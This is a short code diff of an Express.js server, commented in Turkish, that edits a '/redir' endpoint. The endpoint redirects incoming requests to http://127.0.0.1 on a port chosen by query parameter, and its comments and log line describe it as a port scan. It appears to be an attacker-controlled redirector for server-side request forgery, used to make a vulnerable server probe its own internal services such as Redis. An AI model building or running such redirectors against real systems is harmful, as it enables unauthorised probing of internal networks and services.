@@ -11,14 +11,15 @@ app.use((req, res, next) => {
     next();
 });
 
-// Port Tarayıcı Redirector
+// IP ve Port Birlikte Hedefleme
 app.get('/redir', (req, res) => {
-    // Buraya denemek istediğin portu yazacaksın
-    // Örnek: /redir?port=8080 veya /redir?port=6379
-    const port = req.query.port || '80';
+    // URL'den port alacağız, varsayılan 8080 yapalım
+    const port = req.query.port || '8080';
+    
+    // Doğrudan IP ve portu birleştiriyoruz
     const target = `http://127.0.0.1:${port}/`;
     
-    console.log(`[!] Port Taraması Tetiklendi! Hedef Port: ${port} -> ${target}`);
+    console.log(`[!] Port Taraması Tetiklendi -> Hedef: ${target}`);
     
     return res.redirect(302, target);
 });
